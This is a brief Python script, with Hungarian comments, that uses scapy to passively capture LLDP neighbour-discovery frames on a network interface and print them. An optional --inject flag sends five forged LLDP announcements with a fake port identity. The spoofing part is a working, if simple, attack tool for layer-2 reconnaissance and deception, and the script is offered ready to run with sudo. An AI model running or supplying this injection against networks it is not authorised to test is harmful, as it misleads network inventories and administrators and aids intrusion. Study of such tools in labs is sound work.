#!/usr/bin/env python3
"""LLDPDU-k passzív gyűjtése (rendszernév, port, képességek, menedzsment-IP),
plusz opcionálisan HAMIS LLDP-bejegyzés injektálása.
LLDP: IEEE-szabvány, ethertype 0x88CC, multicast 01:80:c2:00:00:0e.

Futtatás: sudo python3 lldp_recon.py eth0 [--inject]
"""
import sys
from scapy.all import sniff, Ether, sendp, conf

LLDP_DST, LLDP_ETHTYPE = "01:80:c2:00:00:0e", 0x88CC

def build_fake_lldp(our_mac):
    chassis = b"\x02\x07\x04" + bytes.fromhex(our_mac.replace(":", ""))
    port = b"\x04\x05\x03\x00\x12\x46\x61\x30\x2f\x38"
    ttl = b"\x06\x02\x00\x78"
    return chassis + port + ttl + b"\x00"

def show_lldp(pkt):
    print(f"[+] LLDPDU látva: {pkt.src}, {len(pkt)} bájt")
    print("    Payload (első 64 bájt):", bytes(pkt)[:64].hex())

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    conf.iface = iface
    if "--inject" in sys.argv:
        frame = Ether(dst=LLDP_DST, src=conf.iface.mac, type=LLDP_ETHTYPE) / \
                build_fake_lldp(conf.iface.mac)
        print(f"[*] Hamis LLDPDU injektálása (chassis = {conf.iface.mac})...")
        for _ in range(5):
            sendp(frame, verbose=0)
    print(f"[*] LLDP-figyelés a(z) {iface}-n 30 mp-ig...")
    sniff(iface=iface, lfilter=lambda p: Ether in p and p[Ether].type == LLDP_ETHTYPE,
          prn=show_lldp, store=0, timeout=30)

if __name__ == "__main__":
    main()
